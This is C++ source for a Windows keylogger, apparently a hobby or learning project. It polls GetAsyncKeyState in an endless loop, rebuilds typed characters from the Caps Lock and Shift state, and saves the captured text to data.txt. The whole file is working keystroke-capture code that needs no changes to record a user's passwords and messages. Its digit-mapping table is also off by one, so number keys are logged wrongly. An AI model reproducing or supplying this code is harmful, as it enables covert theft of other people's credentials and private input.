#include <iostream>
#include <fstream>
#include <windows.h>    // API to work with windows machines 


using namespace std;

string storeKey;  // stores keys

// file to store keys with link
void log() {
    ofstream data("data.txt", ios::trunc);    // overrides file for backspacing

    if(data.is_open()) {        // if file is open then we store text 
        data << storeKey;
    }
    else {
        cout << "Failed to open the file"; 
    }

}

//Handling of capslock

bool bCapsLock() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0; // verifies if key was pressed once

}

//Handling shift key

bool bShiftKey() {
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;      // verifies if key is being held in
}


//converting numbers to string
string key_string(int key) {
    if(key >= 'A' && key <= 'Z') {
        // return string(1, char(key));    // returns 1 character 
        bool capsLock = bCapsLock();
        bool shift = bShiftKey();

        if(capsLock ^ shift) { // using XOR ^ to determine if capslock or shift
            return string(1, char(key));
        }
        else {
            return string(1, char(key + 32)); // on ascii small letters are 32 + capital key number
        }

    }

    //storing numbers
    if(key >= '0' && key <= '9') {
        bool bshift = bShiftKey();

        const char* num = "1234567890";     //char * means it points to the characters in the array
        const char* shiftedNum = "!@#$%^&*()";
        

        return string(1, bshift ? shiftedNum[key - '0'] : num[key - '0']);
    }


    // handling of enter and tab kets
    switch(key) {
        case VK_RETURN:      // virtual key, represents windows key strokes    
            return "\n";
        case VK_SPACE:
            return " ";
        case VK_TAB:
            return "\t";
        // for unknown keys    
        default: 
            return "";
    }

}

// Handling backspace 

void nBackSpace () {
    if(!storeKey.empty()) {
        storeKey.pop_back();    // deletes a chara
    }
    log();
}


int main() {
    while(true) {
        for(int key = 8; key <= 190; key++) {
            // checks if specific key represented by number is being pressed 
            if(GetAsyncKeyState(key) & 0x0001) {

                if(key == VK_BACK) {
                    nBackSpace();
                }
                else {
                    string keySTR = key_string(key);  // converts each key from numeric to string, stored as keySTR 
                    if(!keySTR.empty()) {
                        storeKey += keySTR;
                     }
                     log();
               }
            }
        }
    }
    return 0; 

}